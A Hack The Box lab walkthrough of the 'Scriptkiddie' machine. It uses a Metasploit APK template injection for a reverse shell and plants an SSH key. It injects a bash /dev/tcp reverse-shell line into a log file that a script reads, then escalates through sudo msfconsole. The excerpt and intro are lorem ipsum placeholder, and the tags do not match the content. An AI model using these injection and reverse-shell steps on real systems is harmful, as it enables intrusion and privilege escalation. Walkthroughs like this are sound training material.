---
layout: single
title: Scriptkiddie - Hack The Box
excerpt: "Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."
date: 2021-02-19
classes: wide
header:
  teaser: /assets/images/htb-writeup-scriptkiddie/scriptkiddie_logo.png
  teaser_home_page: true
  icon: /assets/images/linux.png
categories:
  - hackthebox
  - infosec
tags:  
  - linux
  - mysql
  - mattermost
  - hashcat
  - rules
---

![](/assets/images/htb-writeup-scriptkiddie/scriptkiddie_logo.png)

"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."

----------------


   ██╗   ██╗███████╗███████╗██████╗
   ██║   ██║██╔════╝██╔════╝██╔══██╗
   ██║   ██║███████╗█████╗  ██████╔╝
   ██║   ██║╚════██║██╔══╝  ██╔══██╗
   ╚██████╔╝███████║███████╗██║  ██║
    ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝


1. [root:/git/htb/scriptkiddie]# nmap -Pn -sCV -n 10.10.10.226                                                                       (master✱)
    PORT     STATE SERVICE VERSION
    22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey:
    |   3072 3c:65:6b:c2:df:b9:9d:62:74:27:a7:b8:a9:d3:25:2c (RSA)
    |   256 b9:a1:78:5d:3c:1b:25:e0:3c:ef:67:8d:71:d3:a3:ec (ECDSA)
    |_  256 8b:cf:41:82:c6:ac:ef:91:80:37:7c:c9:45:11:e8:43 (ED25519)
    5000/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.8.5)
    |_http-server-header: Werkzeug/0.16.1 Python/3.8.5
    |_http-title: k1d'5 h4ck3r t00l5
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

  DIRB:
  -

  NIKTO:
  -

2. Testing the input fields for input sanitation, find nothing of use. Being able to upload payload template files sounds odd
   and is probably worth digging deeper in.

   Metasploit has a module for creating malicious APK templates, lets try it and see if we can grab a reverse shell.

    msf6 > use exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection
      [*] No payload configured, defaulting to cmd/unix/reverse_netcat
    msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > set LHOSTS 10.10.14.4
      LHOSTS => 10.10.14.4
    msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > set LPORT 4488
      LPORT => 4488
    msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > run
    [+] msf.apk stored at /root/.msf4/local/msf.apk

    [root:/git/htb/scriptkiddie]# mv /root/.msf4/local/msf.apk exploit.apk

   Uploading the template (exploit.apk) and pressing "generate" gives me the error message: "Something went wrong".
   Read about it on the forums and find someone saying to make sure Metasploit is running on the latest version.
   Update, upgrade and test again.


    msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > set lhost 10.10.14.4
      lhost => 10.10.14.4
    msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > set lport 4488
      lport => 4488
    msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > run
      [+] msf.apk stored at /root/.msf4/local/msf.apk

    Upload msf.apk and press "generate"

    [root:/git/htb/scriptkiddie]# nc -lvnp 4488                                                                                       (master✱)
    listening on [any] 4488 ...
    connect to [10.10.14.4] from (UNKNOWN) [10.10.10.226] 47236
    whoami
    kid
    python3 -c 'import pty;pty.spawn("/bin/bash")';
    kid@scriptkiddie:~/html$

    kid@scriptkiddie:~$ cat user.txt
      cat user.txt
      5b891f5e20131d5de2f53b54ef3d7782


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██████╗  ██████╗  ██████╗ ████████╗
   ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝
   ██████╔╝██║   ██║██║   ██║   ██║
   ██╔══██╗██║   ██║██║   ██║   ██║
   ██║  ██║╚██████╔╝╚██████╔╝   ██║
   ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝


1. Create a stable shell by adding pub key to .ssh/authorized_keys

[root:/git/htb/scriptkiddie]# ssh-keygen -t rsa                                                                                    (master✱)
  Generating public/private rsa key pair.
  Enter file in which to save the key (/root/.ssh/id_rsa): /git/htb/scriptkiddie/kid-id_rsa
  Enter passphrase (empty for no passphrase):
  Enter same passphrase again:
  Your identification has been saved in /git/htb/scriptkiddie/kid-id_rsa
  Your public key has been saved in /git/htb/scriptkiddie/kid-id_rsa.pub
  The key fingerprint is:
  SHA256:s9bcIqIjG7KEjauufCkNPenOdi/7ky/1ytozY8bjHYQ root@nidus
  The key's randomart image is:
  +---[RSA 3072]----+
  |                 |
  |                 |
  |                 |
  |          .      |
  |  . .   SE .     |
  |.+ +     *..     |
  |+.* o . B =..    |
  |o=oB.+ *oX.o.    |
  |Oo*=oo=+O**.     |
  +----[SHA256]-----+

kid@scriptkiddie:~/.ssh$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDHi3TbD+fe7fOG2dQmwrmhFQHpJZ4bfJdh4cEEVrEeQyzOpfitMLixOQ9LjUEh+SPUpBEghi0bODevh+dBaw5XBcl9tJXrq21369X+DB2iKnXxk4KMwnJXWJ1CCO5RXRbFx2Ha7pM3jBzKwwQhsgV0aq/LXOPmWK5rfC17GBjB24EOl2QQ5juvjFM61fwesJ3jIGeFMZh846cDQMiYbVlvizg9YxWqZxScVfYBSG1MjgPbg0YwTwdCH47T807Qvbuz6KrEOPhMSADOFh0/lpAe7n8nmHZkGuwOSry3KKR/j523yOATiu8yX0PYy2h0Twp/DDHNxuLoII8abV18GM8rWk53DUw/eCuvKTEaqImJAMh8yUIdWSaYWbiVTh9UvC0Irb7X8a9bej2/+nC5bDJ+ujUKA1TIW2WaeKKLTHZVNKSFNv3i2nuvxlgv+73u3jifbFV9h5qTKg3bCHg+DzgYyVJczT2Id7018I/vlwG9vrAIfDfJ8CjwzWV1ubMlYs0=" > ~/.ssh/authorized_keys

[root:/git/htb/scriptkiddie]# ssh kid@scriptkiddie.htb -i kid-id_rsa
kid@scriptkiddie:~$


2. Enumerating the box we quickly find /home/pwn, and within the script scanlosers.sh.
   The script looks on the file '/home/kid/logs/hackers' and scan their IP with nmap. Maybe we can inject some code in this file and
   get it to run as user pwn.

    kid@scriptkiddie:~/logs$ echo "test  &/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.4/4488 0>&1'" >> hackers

    [root:/git/htb/scriptkiddie]# nc -lvnp 4488                                                                                       (master✱)
      listening on [any] 4488 ...
      connect to [10.10.14.4] from (UNKNOWN) [10.10.10.226] 47908
      bash: cannot set terminal process group (866): Inappropriate ioctl for device
      bash: no job control in this shell
      pwn@scriptkiddie:~$


3. As user pwn, look to see if we have any sudo privs.

  pwn@scriptkiddie:~/.ssh$ sudo -l
    Matching Defaults entries for pwn on scriptkiddie:
        env_reset, mail_badpass,
        secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

    User pwn may run the following commands on scriptkiddie:
        (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole


  pwn@scriptkiddie:~/.ssh$ sudo /opt/metasploit-framework-6.0.9/msfconsole
  msf6 > cat /root/root.txt
    [*] exec: cat /root/root.txt

    b679a52ec65c3c4a12445dc29832ef74


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██╗███╗   ██╗███████╗ ██████╗ ██████╗ ███╗   ███╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
   ██║████╗  ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██╔████╔██║███████║   ██║   ██║██║   ██║██╔██╗ ██║
   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║╚██╔╝██║██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
   ██║██║ ╚████║██║     ╚██████╔╝██║  ██║██║ ╚═╝ ██║██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
   ╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝

apk code injection
  https://www.rapid7.com/db/modules/exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection/
